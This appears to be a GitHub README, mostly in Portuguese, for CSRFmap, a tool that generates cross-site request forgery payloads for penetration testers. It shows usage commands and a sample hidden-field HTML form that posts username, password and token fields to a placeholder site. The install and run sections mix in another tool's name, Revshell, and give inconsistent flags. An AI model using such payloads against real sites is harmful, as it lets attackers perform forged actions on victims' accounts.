<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>

[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=CSRFmap)](https://git.io/typing-svg)



<h4 align="center"> Tool to generate payloads focused on CSRF </h4>


<p align="center">
  <a href="#características">Features</a> •
  <a href="#instalação">Install</a> •
  <a href="#forma-de-utilização">How to use</a> •
  <a href="#executando-revshell">Usage</a>
</p>

---


O CSRFmap é uma ferramenta que gera payloads de Cross-site request forgery. Possui uma funcionalidade que gera diversas possibilidades de exploração.

Projetei o `CSRFmap`  e mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.

# Características

 - Gera payloads CSRF com foco em exploração de falsificação de requisições entre sites.

# Forma de utilização

```sh
python3 CSRFmap.py -a "http://exemplo.com" -m post -t forminteraction -n username password token
```
Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
```yaml
  ____________  ____              
 / ___/ __/ _ \/ __/_ _  ___ ____ 
/ /___\ \/ , _/ _//  ' \/ _ `/ _ \
\___/___/_/|_/_/ /_/_/_/\_,_/ .__/
                           /_/ 
                           Autor: joaovictorti
                           version: 1.0 

options:
  -h, --help            show this help message and exit
  -a ACTION, -A ACTION
  -m METHOD, -M METHOD
  -pl {form_interaction,form_no_interaction,json_request,json_credentials}
  -n NAME [NAME ...], -name NAME [NAME ...]

```

# Instalação

Revshell requer **python3** e para baixá-lo só usar:

```sh
git clone https://github.com/joaoviictorti/Revshell
```

# Executando Revshell

```console
python3 CSRFmap.py -a "http://exemplo.com" -m post -pl form_interaction -n username password token

  ____________  ____              
 / ___/ __/ _ \/ __/_ _  ___ ____ 
/ /___\ \/ , _/ _//  ' \/ _ `/ _ \
\___/___/_/|_/_/ /_/_/_/\_,_/ .__/
                           /_/ 
                           Autor: joaovictorti
                           version: 1.0 
                                               

csrf.html:
<!DOCTYPE html>
<html lang="pt-br">
<body>
	<form action="http://exemplo.com" method="post">
	<input name="username" value="__valor__" type="hidden"/>
	<input name="password" value="__valor__" type="hidden"/>
	<input name="token" value="__valor__" type="hidden"/>
	<input type="submit">Enviar</input>
	</form>
</body>
</html>

```


<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
